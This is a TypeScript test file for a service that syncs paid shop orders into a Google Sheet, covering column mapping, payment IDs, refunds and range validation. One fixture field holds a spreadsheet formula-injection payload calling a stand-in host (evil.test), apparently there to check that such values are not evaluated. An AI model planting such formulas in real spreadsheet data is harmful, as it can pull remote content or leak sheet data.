import { describe, expect, it } from 'vitest';
import {
  DemoSheetsService,
  GoogleSheetsService,
  mapOrderToRow,
  SHEET_HEADERS,
  type SheetOrder,
} from '../../src/modules/sheets/google-sheets.service.js';
import type { PrismaClient } from '@prisma/client';

const timestamp = new Date('2026-01-02T03:04:05.000Z');
const paidOrder = (): SheetOrder => ({
  id: 'order-id',
  publicOrderId: 'MB-TEST',
  recipientName: '=IMPORTXML("https://evil.test","x")',
  recipientPhone: '+77001234567',
  city: 'Алматы',
  address: 'Тестовый адрес',
  productName: 'Шкатулка',
  discTitle: 'Interstellar',
  quantity: 2,
  unitPrice: 20000,
  totalAmount: 41000,
  currency: 'KZT',
  orderStatus: 'PAID',
  paymentStatus: 'PAID',
  paymentProvider: 'mock',
  externalPaymentId: 'payment-id',
  paidAt: timestamp,
  createdAt: timestamp,
  subtotalAmount: 40000,
  deliveryAmount: 1000,
  deliveryMode: 'FIXED_PREPAID',
  version: 2,
  incidentSummary: 'DUPLICATE_PAYMENT',
  packageSnapshot: {
    discs: [
      { id: 'disc_001', title: 'Interstellar', quantity: 2 },
      { id: 'disc_002', title: 'Harry Potter', quantity: 1 },
    ],
  },
  customer: { whatsappId: '77001111111', preferredLanguage: 'kk' },
});

describe('versioned paid order reporting', () => {
  it('maps A:Y with numeric amounts, full package snapshot and preserved contact strings', () => {
    const order = paidOrder();
    const row = mapOrderToRow(order, timestamp);
    expect(row).toHaveLength(25);
    expect(SHEET_HEADERS).toHaveLength(25);
    expect(row).toEqual([
      'MB-TEST',
      timestamp.toISOString(),
      timestamp.toISOString(),
      order.recipientName,
      '+77001111111',
      '+77001234567',
      'kk',
      'Алматы',
      'Тестовый адрес',
      'Шкатулка',
      'Interstellar × 2; Harry Potter',
      2,
      20000,
      41000,
      'KZT',
      'mock',
      'payment-id',
      'PAID',
      'PAID',
      timestamp.toISOString(),
      40000,
      1000,
      'FIXED_PREPAID',
      'DUPLICATE_PAYMENT',
      2,
    ]);
  });
  it('uses the applied attempt ID rather than a later duplicate projection', () => {
    expect(
      mapOrderToRow({
        ...paidOrder(),
        appliedPaymentId: 'first-captured',
        externalPaymentId: 'duplicate-captured',
      })[16],
    ).toBe('first-captured');
  });
  it('refuses never-paid orders but retains reporting after a refund', async () => {
    const unpaid = { ...paidOrder(), paymentStatus: 'PENDING' as const, paidAt: null };
    expect(() => mapOrderToRow(unpaid)).toThrow('Only paid orders');
    await expect(new DemoSheetsService().sync(unpaid)).rejects.toThrow('Only paid orders');
    expect(
      mapOrderToRow({ ...paidOrder(), paymentStatus: 'REFUNDED', orderStatus: 'REFUNDED' })[17],
    ).toBe('REFUNDED');
  });
  it('rejects legacy append ranges or shifted ID columns', () => {
    const options = {
      db: {} as PrismaClient,
      sheetId: 0,
      spreadsheetId: 'id',
      serviceAccountEmail: 'test@example.test',
      privateKey: 'key',
    };
    expect(() => new GoogleSheetsService({ ...options, range: 'Orders!B:Y' })).toThrow('A:Y');
    expect(() => new GoogleSheetsService({ ...options, range: 'Orders!A:T' })).toThrow('A:Y');
  });
});
